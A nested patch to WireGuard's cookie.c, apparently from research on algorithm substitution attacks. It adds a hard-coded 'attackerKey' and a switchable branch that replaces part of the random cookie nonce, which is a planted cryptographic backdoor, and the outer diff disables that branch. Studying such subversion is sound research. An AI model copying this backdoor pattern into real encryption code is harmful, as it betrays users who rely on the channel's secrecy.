@@ -1,5 +1,5 @@
 diff --git a/src/cookie.c b/src/cookie.c
-index 8b7d1fe..c04e6ff 100644
+index 8b7d1fe..43adb2d 100644
 --- a/src/cookie.c
 +++ b/src/cookie.c
 @@ -16,6 +16,12 @@
@@ -7,7 +7,7 @@ index 8b7d1fe..c04e6ff 100644
  #include <crypto/algapi.h>
  
 +//******** ASA modified **********************************************************************************************//
-+#define IV_REPLACEMENT_IN_COOKIE
++//#define IV_REPLACEMENT_IN_COOKIE
 +const u8 attackerKey[16] = {0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78, 0x89,
 +                               0x99, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xff};
 +//********************************************************************************************************************//
@@ -15,7 +15,7 @@ index 8b7d1fe..c04e6ff 100644
  void wg_cookie_checker_init(struct cookie_checker *checker,
  			    struct wg_device *wg)
  {
-@@ -181,13 +187,32 @@ void wg_cookie_message_create(struct message_handshake_cookie *dst,
+@@ -181,14 +187,30 @@ void wg_cookie_message_create(struct message_handshake_cookie *dst,
  			      struct sk_buff *skb, __le32 index,
  			      struct cookie_checker *checker)
  {
@@ -24,14 +24,14 @@ index 8b7d1fe..c04e6ff 100644
 +	u32 counter;
 +    //****************************************************************************************************************//
 +#endif
-+
  	struct message_macs *macs = (struct message_macs *)
  		((u8 *)skb->data + skb->len - sizeof(*macs));
  	u8 cookie[COOKIE_LEN];
  
  	dst->header.type = cpu_to_le32(MESSAGE_HANDSHAKE_COOKIE);
  	dst->receiver_index = index;
-+
+-	get_random_bytes_wait(dst->nonce, COOKIE_NONCE_LEN);
+-
 +#ifdef IV_REPLACEMENT_IN_COOKIE
 +    //******** ASA modified ******************************************************************************************//
 +    get_random_bytes_wait(dst->nonce, 8); // 64 random bits
@@ -42,9 +42,9 @@ index 8b7d1fe..c04e6ff 100644
 +    }
 +#else
 +    //******* Original code ******************************************************************************************//
-     get_random_bytes_wait(dst->nonce, COOKIE_NONCE_LEN);
++    get_random_bytes_wait(dst->nonce, COOKIE_NONCE_LEN);
 +    //****************************************************************************************************************//
 +#endif
- 
  	make_cookie(cookie, skb, checker);
  	xchacha20poly1305_encrypt(dst->encrypted_cookie, cookie, COOKIE_LEN,
+ 				  macs->mac1, COOKIE_LEN, dst->nonce,
